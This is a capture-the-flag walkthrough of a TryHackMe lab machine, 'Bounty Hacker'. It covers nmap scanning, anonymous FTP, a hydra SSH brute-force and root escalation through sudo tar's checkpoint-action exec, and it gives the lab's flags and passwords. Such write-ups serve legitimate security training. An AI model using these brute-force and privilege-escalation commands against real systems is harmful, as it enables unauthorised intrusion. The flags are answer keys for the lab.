# Bounty Hacker

You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!

[Bounty Hacker](https://tryhackme.com/room/cowboyhacker)

## Topic's

- Network Enumeration
- FTP Enumeration
- Brute Forcing (SSH)
- Misconfigured Binaries

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Living up to the title.

You were boasting on and on about your elite hacker skills in the bar and a few Bounty Hunters decided they'd take you up on claims! Prove your status is more than just a few glasses at the bar. I sense bell peppers & beef in your future!

1. Deploy the machine.

`No answer needed`

2. Find open ports on the machine

```
kali@kali:~/CTFs/tryhackme/Bounty Hacker$ sudo nmap -sS -sC -sV -O -A 10.10.156.215
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-05 14:51 CEST
Nmap scan report for 10.10.156.215
Host is up (0.031s latency).
Not shown: 967 filtered ports, 30 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.8.106.222
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Aggressive OS guesses: HP P2000 G3 NAS device (91%), Linux 2.6.32 (90%), Infomir MAG-250 set-top box (90%), Ubiquiti AirMax NanoStation WAP (Linux 2.6.32) (90%), Ubiquiti AirOS 5.5.9 (90%), Linux 2.6.32 - 3.13 (89%), Linux 3.3 (89%), Linux 2.6.32 - 3.1 (89%), Linux 3.7 (89%), Netgear RAIDiator 4.2.21 (Linux 2.6.37) (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 49154/tcp)
HOP RTT      ADDRESS
1   31.06 ms 10.8.0.1
2   31.25 ms 10.10.156.215

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.10 seconds
```

`No answer needed`

3. Who wrote the task list?

```
kali@kali:~/CTFs/tryhackme/Bounty Hacker$ ftp 10.10.156.215
Connected to 10.10.156.215.
220 (vsFTPd 3.0.3)
Name (10.10.156.215:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07 21:41 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07 21:47 task.txt
226 Directory send OK.
ftp> mget *
mget locks.txt?
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
226 Transfer complete.
418 bytes received in 0.08 secs (5.0435 kB/s)
mget task.txt?
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
226 Transfer complete.
68 bytes received in 0.00 secs (245.9491 kB/s)
ftp> exit
221 Goodbye.
```

```
kali@kali:~/CTFs/tryhackme/Bounty Hacker$ cat task.txt
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

`lin`

4. What service can you bruteforce with the text file found?

`ssh`

5. What is the users password?

```
kali@kali:~/CTFs/tryhackme/Bounty Hacker$ hydra -l lin -P locks.txt 10.10.156.215 -t 4 ssh
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-05 14:58:50
[DATA] max 4 tasks per 1 server, overall 4 tasks, 26 login tries (l:1/p:26), ~7 tries per task
[DATA] attacking ssh://10.10.156.215:22/
[22][ssh] host: 10.10.156.215   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-05 14:58:57
```

`RedDr4gonSynd1cat3`

6. user.txt

```
kali@kali:~/CTFs/tryhackme/Bounty Hacker$ ssh lin@10.10.156.215
The authenticity of host '10.10.156.215 (10.10.156.215)' can't be established.
ECDSA key fingerprint is SHA256:fzjl1gnXyEZI9px29GF/tJr+u8o9i88XXfjggSbAgbE.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.156.215' (ECDSA) to the list of known hosts.
lin@10.10.156.215's password:
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

83 packages can be updated.
0 updates are security updates.

Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
lin@bountyhacker:~/Desktop$ ls
user.txt
lin@bountyhacker:~/Desktop$ cat user.txt
THM{CR1M3_SyNd1C4T3}
lin@bountyhacker:~/Desktop$
```

`THM{CR1M3_SyNd1C4T3}`

7. root.txt

```
lin@bountyhacker:~/Desktop$ sudo -l
[sudo] password for lin:
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```

- [.. / tar](https://gtfobins.github.io/gtfobins/tar/)

```
lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# whoami
root
# cd /root
# ls
root.txt
# cat root.txt
THM{80UN7Y_h4cK3r}
#
```

`THM{80UN7Y_h4cK3r}`
